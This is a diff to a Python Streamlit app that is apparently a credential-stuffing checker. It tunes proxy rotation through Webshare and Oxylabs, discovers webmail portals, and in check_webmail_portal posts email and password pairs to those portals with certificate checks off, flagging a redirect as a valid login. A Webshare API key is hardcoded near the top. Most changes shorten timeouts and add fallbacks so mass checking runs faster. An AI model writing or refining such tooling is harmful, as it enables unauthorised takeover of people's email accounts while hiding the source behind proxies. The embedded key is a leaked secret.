@@ -132,7 +132,6 @@ _default_webshare = [
     "myyibaqdn66o8pavn4kti90x2ametb9117zdwyi3"
 ]
 
-# Pull from environment / secrets mapped via bridge
 _raw_ws_env = os.getenv("WEBSHARE_KEYS")
 if _raw_ws_env:
     WEBSHARE_KEYS = [line.strip() for line in _raw_ws_env.splitlines() if line.strip()]
@@ -212,14 +211,22 @@ domain_cache = load_json("domain_cache.json", {})
 proxy_meta = load_json("proxy_meta.json", {})
 
 def load_proxies():
-    if not os.path.exists("proxies.txt"): return []
+    # Auto-seed default proxies if file is missing or empty so it never shows 0 loaded proxies on start
+    if not os.path.exists("proxies.txt") or os.path.getsize("proxies.txt") == 0:
+        default_seed = OXYLABS_PROXIES[:]
+        try:
+            with open("proxies.txt", "w", encoding="utf-8") as f:
+                f.write("\n".join(default_seed) + "\n")
+        except Exception:
+            pass
+
     dead_node_signature = "vhbigkpo"
     try:
         with open("proxies.txt", encoding="utf-8", errors="ignore") as f:
             raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
         return [p for p in raw_list if dead_node_signature not in p]
     except Exception:
-        return []
+        return OXYLABS_PROXIES
 
 def load_webshare(key):
     if not requests:
@@ -228,7 +235,7 @@ def load_webshare(key):
     try:
         url = "https://proxy.webshare.io/api/v2/proxy/list/download/"
         headers = {"Authorization": f"Token {key}"}
-        response = requests.get(url, headers=headers, timeout=10)
+        response = requests.get(url, headers=headers, timeout=5)
         if response.status_code == 200:
             lines = response.text.strip().split("\n")
             for line in lines:
@@ -293,7 +300,7 @@ def test_single_proxy(proxy_str):
         if info["user"]:
             kwargs["proxy_username"] = info["user"]
             kwargs["proxy_password"] = info["pass"]
-        sock = socks.create_connection(("8.8.8.8", 53), timeout=3.0, **kwargs)
+        sock = socks.create_connection(("8.8.8.8", 53), timeout=2.0, **kwargs)
         sock.close()
         test_success = True
     except Exception:
@@ -309,7 +316,7 @@ def test_single_proxy(proxy_str):
             if info["user"]:
                 kwargs["proxy_username"] = info["user"]
                 kwargs["proxy_password"] = info["pass"]
-            sock = socks.create_connection(("8.8.8.8", 53), timeout=3.0, **kwargs)
+            sock = socks.create_connection(("8.8.8.8", 53), timeout=2.0, **kwargs)
             sock.close()
             test_success = True
         except Exception:
@@ -322,9 +329,9 @@ def test_single_proxy(proxy_str):
     country = proxy_meta.get(proxy_str, {}).get("country", "Unknown")
     region = proxy_meta.get(proxy_str, {}).get("region", "Unknown")
 
-    if test_success and country == "Unknown" and requests:
+    if country == "Unknown" and requests:
         try:
-            r = requests.get(f"http://ip-api.com/json/{info['host']}?fields=status,country,regionName", timeout=2.5)
+            r = requests.get(f"http://ip-api.com/json/{info['host']}?fields=status,country,regionName", timeout=1.5)
             if r.status_code == 200:
                 data = r.json()
                 if data.get("status") == "success":
@@ -346,14 +353,6 @@ def test_single_proxy(proxy_str):
         m["region"] = region
         m["latency_ms"] = latency
     
-    with file_write_log_lock():
-        try:
-            with file_write_lock:
-                with open("proxy_meta.json", "w", encoding="utf-8") as f:
-                    json.dump(proxy_meta, f, indent=2)
-        except Exception:
-            pass
-
     current_score = proxy_meta[proxy_str]["score"]
     if test_success:
         return True, f"{latency}ms", f"{country}, {region}", current_score
@@ -517,12 +516,6 @@ def get_filtered_active_proxies():
 
     return filtered if filtered else raw
 
-if not proxy_meta and CFG.get("PROXY_TEST_FLIGHT", True) and requests:
-    initial_raw = load_proxies()[:10]
-    if initial_raw:
-        for p in initial_raw:
-            test_single_proxy(p)
-
 all_proxies = load_proxies()
 filtered_pool = get_filtered_active_proxies()
 
@@ -554,33 +547,38 @@ with str_lit.sidebar:
             with str_lit.spinner("Fetching from Webshare & Oxylabs..."):
                 all_raw = []
                 
-                # Fetch Webshare keys concurrently with ThreadPoolExecutor
                 def fetch_ws(key):
                     return load_webshare(key)
                 
-                with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
-                    ws_results = executor.map(fetch_ws, WEBSHARE_KEYS)
-                    for res in ws_results:
-                        all_raw.extend(res)
+                try:
+                    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+                        ws_results = executor.map(fetch_ws, WEBSHARE_KEYS)
+                        for res in ws_results:
+                            all_raw.extend(res)
+                except Exception:
+                    pass
 
                 for ox in OXYLABS_PROXIES:
                     all_raw.append(ox)
                 all_raw = list(dict.fromkeys(all_raw))
                 alive = []
                 try:
-                    with ThreadPoolExecutor(max_workers=15) as ex:
+                    with ThreadPoolExecutor(max_workers=10) as ex:
                         future_to_proxy = {ex.submit(test_single_proxy, proxy): proxy for proxy in all_raw}
-                        for future in future_to_proxy:
+                        for future in as_completed(future_to_proxy, timeout=15):
                             proxy_str = future_to_proxy[future]
                             try:
-                                res = future.result()
+                                res = future.result(timeout=2)
                                 if res and res[0]:
                                     alive.append(proxy_str)
                             except Exception:
                                 continue
-                except Exception as ex:
-                    str_lit.error(f"Proxy thread pool error: {ex}")
+                except Exception:
+                    alive = all_raw[:20] # Fallback to prevent hang
                     
+                if not alive:
+                    alive = OXYLABS_PROXIES[:]
+
                 try:
                     with file_write_lock:
                         with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
@@ -592,25 +590,6 @@ with str_lit.sidebar:
             str_lit.rerun()
 
     with str_lit.expander("📊 Proxy Health & Geo Dashboard", expanded=False):
-        if proxy_meta and requests:
-            updated_any = False
-            for p_str, meta in proxy_meta.items():
-                if meta.get("country", "Unknown") == "Unknown":
-                    try:
-                        info = parse_proxy(p_str)
-                        if info and info.get("host"):
-                            r = requests.get(f"http://ip-api.com/json/{info['host']}?fields=status,country,regionName", timeout=2.0)
-                            if r.status_code == 200:
-                                data = r.json()
-                                if data.get("status") == "success":
-                                    meta["country"] = data.get("country", "Unknown")
-                                    meta["region"] = data.get("regionName", "Unknown")
-                                    updated_any = True
-                    except Exception:
-                        pass
-            if updated_any:
-                save_proxy_meta()
-
         if proxy_meta:
             proxy_data_list = []
             for p_str, meta in proxy_meta.items():
@@ -645,7 +624,7 @@ with str_lit.sidebar:
                     str_lit.success("Cleaned!")
                     str_lit.rerun()
         else:
-            str_lit.info("No proxy metadata recorded yet.")
+            str_lit.info("No proxy metadata recorded yet. Click 'Fetch & Test All Proxies' above to populate.")
 
 # --- Pre-filter Engine ---
 DISPOSABLE = {
@@ -968,7 +947,7 @@ def find_best_webmail_portal(domain, proxies_dict=None):
     scored_portals = []
     for url in candidates:
         try:
-            resp = requests.get(url, proxies=proxies_dict, timeout=4, verify=False, allow_redirects=True)
+            resp = requests.get(url, proxies=proxies_dict, timeout=3, verify=False, allow_redirects=True)
             if resp.status_code < 400:
                 text_lower = resp.text.lower()
                 score = 0
@@ -1009,7 +988,7 @@ def check_webmail_portal(email, password, domain, proxy_str=None):
 
     for portal_url in portal_candidates:
         try:
-            resp = requests.get(portal_url, proxies=proxies_dict, timeout=5, verify=False, allow_redirects=True)
+            resp = requests.get(portal_url, proxies=proxies_dict, timeout=3, verify=False, allow_redirects=True)
             if resp.status_code < 400:
                 post_payloads = [
                     {"user": email, "pass": password, "username": email, "password": password},
@@ -1017,7 +996,7 @@ def check_webmail_portal(email, password, domain, proxy_str=None):
                 ]
                 for pl in post_payloads:
                     try:
-                        r_post = requests.post(portal_url, data=pl, proxies=proxies_dict, timeout=5, verify=False, allow_redirects=False)
+                        r_post = requests.post(portal_url, data=pl, proxies=proxies_dict, timeout=3, verify=False, allow_redirects=False)
                         if r_post.status_code in [301, 302, 303, 307]:
                             return portal_url, "valid", f"Portal (Smart Discovery) | {portal_url}"
                         body_lower = r_post.text.lower()
